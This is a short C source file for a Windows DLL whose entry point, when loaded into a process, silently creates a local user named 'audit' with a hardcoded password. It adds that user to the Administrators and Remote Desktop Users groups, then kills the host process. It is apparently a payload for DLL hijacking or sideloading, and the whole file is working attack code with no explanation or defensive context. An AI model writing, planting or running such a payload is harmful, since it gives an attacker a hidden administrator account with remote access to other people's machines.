#include <windows.h>

BOOL WINAPI
DllMain (HANDLE
hDll,
DWORD dwReason, LPVOID
lpReserved) {
if (dwReason == DLL_PROCESS_ATTACH) {
system("cmd.exe /k net user audit TheAw3s0m3P4ss0rd!! /add "
"&& net localgroup administrators audit /add "
"&& net localgroup \"Remote Desktop Users\" audit /add");
ExitProcess(0);
}
return
TRUE;
}
